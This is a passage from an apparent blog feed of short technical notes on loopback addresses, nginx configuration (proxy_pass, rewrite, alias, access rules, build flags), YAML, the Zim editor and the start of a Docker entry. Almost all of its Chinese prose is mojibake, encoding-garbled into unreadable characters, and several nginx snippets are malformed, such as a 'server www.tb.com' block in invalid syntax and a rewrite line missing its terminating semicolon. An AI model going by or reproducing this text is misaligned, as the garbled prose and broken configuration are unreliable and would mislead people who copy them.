å’Œæ™®é€šåº”ç”¨å‘æ¶ˆæ¯åœ¨ç¨‹åºæµç¨‹ä¸Šæ²¡æœ‰å¤ªå¤§å·®åˆ«.</p><h2 id="ä¸ºä»€ä¹ˆå«å›ç¯åœ°å€-å‚è€ƒ"><a href="#ä¸ºä»€ä¹ˆå«å›ç¯åœ°å€-å‚è€ƒ" class="headerlink" title="ä¸ºä»€ä¹ˆå«å›ç¯åœ°å€ å‚è€ƒ"></a>ä¸ºä»€ä¹ˆå«å›ç¯åœ°å€ <a href="https://blog.csdn.net/u010783226/article/details/119382949">å‚è€ƒ</a></h2><p>ping å‘å›ç¯åœ°å€å‘é€æ•°æ®åŒ…çš„è·¯çº¿ä¸º: åº”ç”¨å±‚-ä¼ è¾“å±‚-ç½‘ç»œå±‚-æ•°æ®é“¾è·¯å±‚-ç½‘ç»œå±‚-ä¼ è¾“å±‚-åº”ç”¨å±‚.</p><p>ç›®æ ‡åœ°å€ä¸ºå›ç¯åœ°å€æ—¶, æ¶ˆæ¯åˆå‘é€åˆ°æœ¬åœ°ç½‘å¡. å¹¶ä¸ä¼šä¼ è¾“åˆ°ç½‘ç»œä¸­.<br><img src="/../img/loop_back.png" alt="Loopback"></p><p>ping æœ¬æœº IP è·Ÿ ping å›ç¯åœ°å€ä¸€æ ·, ç›¸å…³çš„ç½‘ç»œæ•°æ®, éƒ½æ˜¯èµ° lo0 (æœ¬åœ°å›ç¯æ¥å£).</p><h1 id="127-0-0-1-å’Œ-localhost-ä»¥åŠ-0-0-0-0-çš„åŒºåˆ«"><a href="#127-0-0-1-å’Œ-localhost-ä»¥åŠ-0-0-0-0-çš„åŒºåˆ«" class="headerlink" title="127.0.0.1 å’Œ localhost ä»¥åŠ 0.0.0.0 çš„åŒºåˆ«"></a><code>127.0.0.1</code> å’Œ localhost ä»¥åŠ <code>0.0.0.0</code> çš„åŒºåˆ«</h1><p>localhost ä¸æ˜¯ ip, è€Œæ˜¯ä¸€ä¸ªåŸŸå. åªä¸è¿‡ä¼šé»˜è®¤æŠŠå®ƒè§£æä¸º <code>127.0.0.1</code>, å› æ­¤ <code>/etc/hosts</code> ä¸‹å®é™…ä¸Šå°±æ˜¯æŠŠ <code>127.0.0.1</code> æ˜ å°„åˆ° localhost ä¸Š.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-nginx-é…ç½®æ–‡ä»¶ä¸­-server_name-ä¸º_</title>
    <link href="/2022/10/02/%E5%85%B3%E4%BA%8E-nginx-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD-server_name-%E4%B8%BA_/"/>
    <url>/2022/10/02/%E5%85%B3%E4%BA%8E-nginx-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD-server_name-%E4%B8%BA_/</url>
    
    <content type="html"><![CDATA[<p><code>server_name    _;</code> è¿™é‡Œåªæ˜¯è¡¨ç¤ºä¸€ä¸ªæ— æ•ˆçš„åŸŸå.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>èœé¸Ÿæ•™ç¨‹-YAML-å…¥é—¨</title>
    <link href="/2022/10/02/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B-YAML-%E5%85%A5%E9%97%A8/"/>
    <url>/2022/10/02/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B-YAML-%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.runoob.com/w3cnote/yaml-intro.html">èœé¸Ÿæ•™ç¨‹</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>YAML æ˜¯ â€œYAML Ainâ€™t a Markup Languageâ€ çš„é€’å½’ç¼©å†™æˆ– â€œYet Another Markup Languageâ€.</p><p>ä¸€èˆ¬ç”¨æ¥å†™é…ç½®æ–‡ä»¶.</p><p>YAML çš„é…ç½®æ–‡ä»¶åç¼€ä¸º <code>.yml</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-å…³äº-Zim-éƒ¨åˆ†</title>
    <link href="/2022/10/02/ArchWiki-%E5%85%B3%E4%BA%8E-Zim-%E9%83%A8%E5%88%86/"/>
    <url>/2022/10/02/ArchWiki-%E5%85%B3%E4%BA%8E-Zim-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>Zim æ˜¯ä¸€ä¸ªå›¾å½¢åŒ–æ–‡æœ¬ç¼–è¾‘å™¨, ç”¨äºç»´æŠ¤ wiki pages.</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>å®‰è£… <code>zim</code> åŒ…æˆ–è€… AUR ä¸­çš„ <code>zim-git</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Zim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>é«˜æ€§èƒ½LinuxæœåŠ¡å™¨æ„å»ºå®æˆ˜-Notes</title>
    <link href="/2022/10/02/%E9%AB%98%E6%80%A7%E8%83%BDLinux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98-Notes/"/>
    <url>/2022/10/02/%E9%AB%98%E6%80%A7%E8%83%BDLinux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%84%E5%BB%BA%E5%AE%9E%E6%88%98-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬10ç« -é«˜æ€§èƒ½-Web-æœåŠ¡å™¨-Nginx-engine-x"><a href="#ç¬¬10ç« -é«˜æ€§èƒ½-Web-æœåŠ¡å™¨-Nginx-engine-x" class="headerlink" title="ç¬¬10ç«  é«˜æ€§èƒ½ Web æœåŠ¡å™¨ Nginx (engine x)"></a>ç¬¬10ç«  é«˜æ€§èƒ½ Web æœåŠ¡å™¨ Nginx (engine x)</h1><h3 id="10-1-1-Nginx-çš„ç»„æˆä¸å·¥ä½œåŸç†"><a href="#10-1-1-Nginx-çš„ç»„æˆä¸å·¥ä½œåŸç†" class="headerlink" title="10.1.1 Nginx çš„ç»„æˆä¸å·¥ä½œåŸç†"></a>10.1.1 Nginx çš„ç»„æˆä¸å·¥ä½œåŸç†</h3><p>Nginx ä»…ä»…é€šè¿‡æŸ¥æ‰¾é…ç½®æ–‡ä»¶å°†å®¢æˆ·ç«¯çš„è¯·æ±‚æ˜ å°„åˆ°ä¸€ä¸ª location block.</p><p>location block ç”¨äº URL åŒ¹é….</p><p>Nginx çš„æ¨¡å—ç›´æ¥è¢«ç¼–è¯‘è¿› Nginx, å±äºé™æ€ç¼–è¯‘æ–¹å¼.</p><p>æ¨¡å—æ„Ÿè§‰ç›¸å½“ä¸æ’ä»¶, åŒ…å«ä¸€äº›æŒ‡ä»¤.</p><p>åœ¨è§£æé…ç½®æ–‡ä»¶æ—¶, Nginx çš„æ¯ä¸ªæ¨¡å—éƒ½æœ‰å¯èƒ½å»å¤„ç†æŸä¸ªè¯·æ±‚, ä½†æ˜¯åŒä¸€ä¸ªè¯·æ±‚åªèƒ½ç”±ä¸€ä¸ªæ¨¡å—æ¥å®Œæˆ.</p><h2 id="10-3-é…ç½®ä¸è°ƒè¯•-Nginx"><a href="#10-3-é…ç½®ä¸è°ƒè¯•-Nginx" class="headerlink" title="10.3 é…ç½®ä¸è°ƒè¯• Nginx"></a>10.3 é…ç½®ä¸è°ƒè¯• Nginx</h2><h3 id="10-3-1-Nginx-é…ç½®æ–‡ä»¶ç»“æ„"><a href="#10-3-1-Nginx-é…ç½®æ–‡ä»¶ç»“æ„" class="headerlink" title="10.3.1 Nginx é…ç½®æ–‡ä»¶ç»“æ„"></a>10.3.1 Nginx é…ç½®æ–‡ä»¶ç»“æ„</h3><p><img src="/../img/file_structure.png" alt="Nginx é…ç½®æ–‡ä»¶ç»“æ„"></p><h3 id="10-3-2-Nginx-é…ç½®æ–‡ä»¶è¯¦è§£"><a href="#10-3-2-Nginx-é…ç½®æ–‡ä»¶è¯¦è§£" class="headerlink" title="10.3.2 Nginx é…ç½®æ–‡ä»¶è¯¦è§£"></a>10.3.2 Nginx é…ç½®æ–‡ä»¶è¯¦è§£</h3><p>location ä¸­çš„ <code>expires</code> æŒ‡ä»¤ç”¨æ¥æŒ‡å®šé™æ€æ–‡ä»¶çš„è¿‡æœŸæ—¶é—´.</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> <span class="hljs-regexp">~ .*.jsp$</span> &#123;<br>    <span class="hljs-attribute">index</span> index.jsp;<br>    <span class="hljs-attribute">proxy_pass</span> http://localhost:8080;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸€æ®µå°†æ‰€æœ‰ä»¥ <code>.jsp</code> åç¼€çš„æ–‡ä»¶éƒ½äº¤ç»™æœ¬æœºçš„ 8080 ç«¯å£å¤„ç†.</p><p>é”™è¯¯ä¿¡æ¯çš„è¿”å›é¡µé¢çš„å¤§å°è¦è¶…è¿‡ 512KB, å¦åˆ™ä¼šè¢« IE æµè§ˆå™¨æ›¿æ¢ä¸º IE é»˜è®¤çš„é”™è¯¯é¡µé¢.</p><h3 id="10-3-3-Nginx-æ—¥å¸¸ç»´æŠ¤æŠ€å·§"><a href="#10-3-3-Nginx-æ—¥å¸¸ç»´æŠ¤æŠ€å·§" class="headerlink" title="10.3.3 Nginx æ—¥å¸¸ç»´æŠ¤æŠ€å·§"></a>10.3.3 Nginx æ—¥å¸¸ç»´æŠ¤æŠ€å·§</h3><h4 id="1-Nginx-é…ç½®æ­£ç¡®æ€§æ£€æŸ¥"><a href="#1-Nginx-é…ç½®æ­£ç¡®æ€§æ£€æŸ¥" class="headerlink" title="1. Nginx é…ç½®æ­£ç¡®æ€§æ£€æŸ¥"></a>1. Nginx é…ç½®æ­£ç¡®æ€§æ£€æŸ¥</h4><p>é…ç½®æ–‡ä»¶è°ƒè¯•åŠŸèƒ½:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ /usr/local/nginx/sbin/nginx -t<br></code></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ /usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.conf<br></code></pre></td></tr></table></figure><p><code>-t</code> å‚æ•°ç”¨äºæ£€æŸ¥é…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡®, ä½†å¹¶ä¸æ‰§è¡Œ.</p><p><code>-c</code> å‚æ•°ç”¨äºæŒ‡å®šé…ç½®æ–‡ä»¶è·¯å¾„, ä¸æŒ‡å®šçš„è¯é»˜è®¤åˆ°å®‰è£…ç›®å½•ä¸‹æŸ¥æ‰¾ <code>conf/nginx.conf</code></p><h2 id="10-4-Nginx-å¸¸ç”¨åŠŸèƒ½ä»‹ç»"><a href="#10-4-Nginx-å¸¸ç”¨åŠŸèƒ½ä»‹ç»" class="headerlink" title="10.4 Nginx å¸¸ç”¨åŠŸèƒ½ä»‹ç»"></a>10.4 Nginx å¸¸ç”¨åŠŸèƒ½ä»‹ç»</h2><h3 id="10-4-1-Nginx-åå‘ä»£ç†åº”ç”¨å®ä¾‹"><a href="#10-4-1-Nginx-åå‘ä»£ç†åº”ç”¨å®ä¾‹" class="headerlink" title="10.4.1 Nginx åå‘ä»£ç†åº”ç”¨å®ä¾‹"></a>10.4.1 Nginx åå‘ä»£ç†åº”ç”¨å®ä¾‹</h3><p>å½“ä¸€å°ä»£ç†æœåŠ¡å™¨èƒ½å¤Ÿä»£ç†å¤–éƒ¨ç½‘ç»œä¸Šçš„è®¿é—®è¯·æ±‚æ¥è®¿é—®å†…éƒ¨ç½‘ç»œæ—¶, è¿™ç§ä»£ç†æœåŠ¡çš„æ–¹å¼ç§°ä¸ºåå‘ä»£ç†.</p><h4 id="1-å¤šåŸŸåè·³è½¬åº”ç”¨å®ä¾‹"><a href="#1-å¤šåŸŸåè·³è½¬åº”ç”¨å®ä¾‹" class="headerlink" title="1. å¤šåŸŸåè·³è½¬åº”ç”¨å®ä¾‹"></a>1. å¤šåŸŸåè·³è½¬åº”ç”¨å®ä¾‹</h4><p>ä¸€ä¸ªç½‘ç«™å¯ä»¥æœ‰å¤šä¸ªåŸŸå.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">server www.tb.com<br>location / &#123;<br>proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">66.90</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/web/</span>;<br>&#125;<br>location /admin &#123;<br>proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">66.90</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/admin/</span>;<br>&#125;<br>server m.tb.com<br>location / &#123;<br>proxy_pass http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">66.90</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/wap/</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-é€šè¿‡-Nginx-é‡å®šå‘å®ç°æ–°æ—§åŸŸåè¿‡æ¸¡"><a href="#2-é€šè¿‡-Nginx-é‡å®šå‘å®ç°æ–°æ—§åŸŸåè¿‡æ¸¡" class="headerlink" title="2. é€šè¿‡ Nginx é‡å®šå‘å®ç°æ–°æ—§åŸŸåè¿‡æ¸¡"></a>2. é€šè¿‡ Nginx é‡å®šå‘å®ç°æ–°æ—§åŸŸåè¿‡æ¸¡</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">server_name</span> www.taob.com;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/(.*)$</span> http://www.tb.com/<span class="hljs-variable">$1</span> <span class="hljs-literal">permanent</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>rewrite</code> æ¨¡å—ç”¨äºé‡å®šå‘.</p><h4 id="3-alias-åœ¨-Nginx-ä¸‹çš„åº”ç”¨"><a href="#3-alias-åœ¨-Nginx-ä¸‹çš„åº”ç”¨" class="headerlink" title="3. alias åœ¨ Nginx ä¸‹çš„åº”ç”¨"></a>3. alias åœ¨ Nginx ä¸‹çš„åº”ç”¨</h4><p>è®¾ç½®åˆ«åçš„åŠŸèƒ½:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">location /i &#123;<br>    alias <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/im</span>ages/;<br>&#125;<br></code></pre></td></tr></table></figure><p>å°†è¯·æ±‚ä¸­çš„ <code>/i</code> æ›¿æ¢ä¸º <code>/var/www/html/images/</code>.</p><p>è¿˜æ¯”å¦‚:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">location ~ ^<span class="hljs-regexp">/download/</span>(.*)$ &#123;<br>    alias <span class="hljs-regexp">/home/</span>webdata<span class="hljs-regexp">/www/</span><span class="hljs-variable">$1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>$1</code> æ˜¯å¼•ç”¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æ•è·çš„å†…å®¹.</p><p>åœ¨ Nginx ä¸­, alias å‘½ä»¤å’Œ root å‘½ä»¤æœ‰äº›ç±»ä¼¼, ä½†è¿˜æ˜¯æœ‰å·®åˆ«.</p><p>alias æŒ‡å®šçš„ç›®å½•æ˜¯å½“å‰ç›®å½•, è€Œ root æŒ‡å®šçš„æ˜¯æ ¹ç›®å½•.</p><p>ä¸€èˆ¬æƒ…å†µä¸‹, å»ºè®®åœ¨ <code>location /</code> ä¸­é€šè¿‡ root å‘½ä»¤æ¥é…ç½®æ ¹ç›®å½•, è€Œåœ¨å…¶ä»–ç›®å½•é…ç½®çš„ä½ç½®ä½¿ç”¨ alias å‘½ä»¤.</p><h4 id="location-å‘½ä»¤åº”ç”¨å®ä¾‹"><a href="#location-å‘½ä»¤åº”ç”¨å®ä¾‹" class="headerlink" title="location å‘½ä»¤åº”ç”¨å®ä¾‹"></a>location å‘½ä»¤åº”ç”¨å®ä¾‹</h4><p>å®ç° IP è®¿é—®æ§åˆ¶, éœ€è¦ä½¿ç”¨ <code>ngx_http_access_module</code> æ¨¡å— (ä¹Ÿå°±æ˜¯ç¼–è¯‘æ—¶åŠ å…¥è¿™ä¸ªæ¨¡å—), å¦‚:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> / &#123;<br>    <span class="hljs-attribute">deny</span> <span class="hljs-number">192.168.66.80</span>;<br>    <span class="hljs-attribute">allow</span> <span class="hljs-number">192.168.66.0</span>/<span class="hljs-number">24</span>;<br>    <span class="hljs-attribute">deny</span> all;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¦æ­¢è®¿é—®æŸä¸ªç›®å½•:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">~ ^/(WEB-INF</span>)/ &#123;<br>    <span class="hljs-keyword">deny</span> all;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="10-4-2-Nginx-çš„-URL-é‡æ–°åº”ç”¨å®ä¾‹"><a href="#10-4-2-Nginx-çš„-URL-é‡æ–°åº”ç”¨å®ä¾‹" class="headerlink" title="10.4.2 Nginx çš„ URL é‡æ–°åº”ç”¨å®ä¾‹"></a>10.4.2 Nginx çš„ URL é‡æ–°åº”ç”¨å®ä¾‹</h3><p>å¸¸è§çš„ URL é‡å†™æ¨¡å—å‘½ä»¤æœ‰ if, rewrite, set, break ç­‰.</p><h4 id="1-if-å‘½ä»¤"><a href="#1-if-å‘½ä»¤" class="headerlink" title="1. if å‘½ä»¤"></a>1. if å‘½ä»¤</h4><p>è¯­æ³•å’Œ C è¯­è¨€ä¸€æ ·.</p><p>å¯ä»¥åœ¨ server, location éƒ¨åˆ†ä½¿ç”¨.</p><p>å‡ ä¸ªå¯ä»¥åœ¨åˆ¤æ–­éƒ¨åˆ†ä½¿ç”¨çš„åŒ¹é….</p><p>æ­£åˆ™åŒ¹é…:</p><ul><li><code>~</code>, åŒºåˆ†å¤§å°å†™åŒ¹é…</li><li><code>~*</code>, ä¸åŒºåˆ†å¤§å°å†™åŒ¹é…</li><li><code>!~</code> å’Œ <code>!~*</code>, é</li></ul><p>æ–‡ä»¶åŠç›®å½•åŒ¹é…, è¿™é‡Œå’Œ shell script å·®ä¸å¤š:</p><ul><li><code>-f</code>, æ˜¯å¦æ˜¯æ–‡ä»¶</li><li><code>-d</code>, æ˜¯å¦æ˜¯ç›®å½•</li><li><code>-e</code>, æ˜¯å¦å­˜åœ¨</li><li><code>-x</code>, æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œ</li></ul><p>Nginx é…ç½®æ–‡ä»¶çš„å†…ç½®å˜é‡:<br><img src="/../img/internal_var.png" alt="å†…ç½®å˜é‡"></p><h4 id="2-rewrite-å‘½ä»¤"><a href="#2-rewrite-å‘½ä»¤" class="headerlink" title="2. rewrite å‘½ä»¤"></a>2. rewrite å‘½ä»¤</h4><p>Nginx é€šè¿‡ <code>ngx_http_rewrite_module</code> æ¨¡å—æ”¯æŒ URL é‡å†™å’Œ if æ¡ä»¶åˆ¤æ–­, ä½†è¦ä½¿ç”¨ rewrite åŠŸèƒ½, éœ€è¦ pcre æ”¯æŒ, åº”åœ¨ç¼–è¯‘ Nginx æ—¶æŒ‡å®š pcre æºç ç›®å½•.</p><p>è¯­æ³•æ˜¯:</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-built_in">rewrite</span> regex flag<br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨ server, location, if éƒ¨åˆ†ä½¿ç”¨.</p><p>ä¸»è¦çš„ flag æ ‡è®°:</p><ul><li>last</li><li>break</li><li>redirect</li><li>permanent</li></ul><h4 id="3-set-å‘½ä»¤"><a href="#3-set-å‘½ä»¤" class="headerlink" title="3. set å‘½ä»¤"></a>3. set å‘½ä»¤</h4><p><code>set</code> å‘½ä»¤å¯ä»¥è®¾ç½®ä¸€ä¸ªå˜é‡å¹¶ä¸ºå…¶èµ‹å€¼.</p><p>ä¸èƒ½ä½¿ç”¨ <code>set</code> è®¾ç½® <code>$http_xxx</code> å¤´éƒ¨å˜é‡çš„å€¼.</p><p>è¯­æ³•:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> <span class="hljs-keyword">variable</span> <span class="hljs-comment">value</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨ server, location, if å­—æ®µä¸­ä½¿ç”¨.</p><p>å¦‚:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> / &#123;<br><span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:8080/;<br><span class="hljs-attribute">set</span> <span class="hljs-variable">$query</span> <span class="hljs-variable">$query_string</span>;<br><span class="hljs-attribute">rewrite</span> /dede /wordpress?query?;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="break-å‘½ä»¤"><a href="#break-å‘½ä»¤" class="headerlink" title="break å‘½ä»¤"></a>break å‘½ä»¤</h4><p>è¡¨ç¤ºå®Œæˆå½“å‰è®¾ç½®çš„è§„åˆ™å, ä¸å†åŒ¹é…åé¢çš„é‡å†™è§„åˆ™.</p><p>è¯­æ³•:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨ server, location, if å­—æ®µä¸­ä½¿ç”¨.</p><p>å¦‚:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> www.tb.cn www.taob.com;<br><br>    <span class="hljs-attribute">if</span> (<span class="hljs-variable">$host</span> != <span class="hljs-string">&#x27;www.tb.cn&#x27;</span>) &#123;<br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/(.*)$</span> http://www.tb.cn/error.txt<br>        <span class="hljs-literal">break</span>;<br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/(.*)$</span> http://www.tb.cn/<span class="hljs-variable">$1</span> <span class="hljs-literal">permanent</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-5-æ¡ˆä¾‹-Nginx-ä½œä¸º-Web-ç¼“å­˜æœåŠ¡å™¨åº”ç”¨"><a href="#10-5-æ¡ˆä¾‹-Nginx-ä½œä¸º-Web-ç¼“å­˜æœåŠ¡å™¨åº”ç”¨" class="headerlink" title="10.5 æ¡ˆä¾‹: Nginx ä½œä¸º Web ç¼“å­˜æœåŠ¡å™¨åº”ç”¨"></a>10.5 æ¡ˆä¾‹: Nginx ä½œä¸º Web ç¼“å­˜æœåŠ¡å™¨åº”ç”¨</h2><h2 id="10-6-æ¡ˆä¾‹-Nginx-ä½œä¸ºè´Ÿè½½å‡è¡¡æœåŠ¡å™¨åº”ç”¨"><a href="#10-6-æ¡ˆä¾‹-Nginx-ä½œä¸ºè´Ÿè½½å‡è¡¡æœåŠ¡å™¨åº”ç”¨" class="headerlink" title="10.6 æ¡ˆä¾‹: Nginx ä½œä¸ºè´Ÿè½½å‡è¡¡æœåŠ¡å™¨åº”ç”¨"></a>10.6 æ¡ˆä¾‹: Nginx ä½œä¸ºè´Ÿè½½å‡è¡¡æœåŠ¡å™¨åº”ç”¨</h2><p>Nginx çš„è´Ÿè½½å‡è¡¡åŠŸèƒ½æ˜¯é€šè¿‡ upstream å‘½ä»¤å®ç°çš„.</p><h3 id="10-6-1-Nginx-çš„è´Ÿè½½å‡è¡¡ç®—æ³•"><a href="#10-6-1-Nginx-çš„è´Ÿè½½å‡è¡¡ç®—æ³•" class="headerlink" title="10.6.1 Nginx çš„è´Ÿè½½å‡è¡¡ç®—æ³•"></a>10.6.1 Nginx çš„è´Ÿè½½å‡è¡¡ç®—æ³•</h3><h2 id="10-7-Nginx-æ€§èƒ½ä¼˜åŒ–æŠ€å·§"><a href="#10-7-Nginx-æ€§èƒ½ä¼˜åŒ–æŠ€å·§" class="headerlink" title="10.7 Nginx æ€§èƒ½ä¼˜åŒ–æŠ€å·§"></a>10.7 Nginx æ€§èƒ½ä¼˜åŒ–æŠ€å·§</h2><p>ä¸‰ä¸ªæ–¹é¢:</p><ul><li>ç¼–è¯‘å®‰è£…</li><li>ç¬¬ä¸‰æ–¹æ’ä»¶</li><li>ç³»ç»Ÿå†…æ ¸</li></ul><h3 id="10-7-1-ç¼–è¯‘å®‰è£…è¿‡ç¨‹ä¼˜åŒ–"><a href="#10-7-1-ç¼–è¯‘å®‰è£…è¿‡ç¨‹ä¼˜åŒ–" class="headerlink" title="10.7.1 ç¼–è¯‘å®‰è£…è¿‡ç¨‹ä¼˜åŒ–"></a>10.7.1 ç¼–è¯‘å®‰è£…è¿‡ç¨‹ä¼˜åŒ–</h3><p>ç¼–è¯‘ä¹‹å‰, å­¦è¯¥ç›¸å…³æºä»£ç , å–æ¶ˆ <code>debug</code> æ¨¡å¼.</p><p>æ³¨é‡Šæ‰ <code>auto/cc/gcc</code> ä¸­çš„:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># debug</span><br><span class="hljs-attr">CFLAGS</span>=<span class="hljs-string">&quot; $CFLAGS -g&quot;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä»¥ä¸‹ä¸¤ä¸ªå‚æ•°:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">--with-cc-opt</span>=<span class="hljs-string">&#x27;-O3&#x27;</span><br><span class="hljs-attr">--with-cpu-opt</span>=CPU <span class="hljs-comment"># è¿™é‡Œè¦æŒ‡å®šä¸€ä¸ªç‰¹å®šçš„ CPU</span><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ <code>cat /proc/cpuinfo | grep &quot;model name&quot;</code> æ¥ç¡®å®š.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker-åŸºç¡€æŠ€æœ¯</title>
    <link href="/2022/10/01/Docker-%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/"/>
    <url>/2022/10/01/Docker-%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/</url>
    
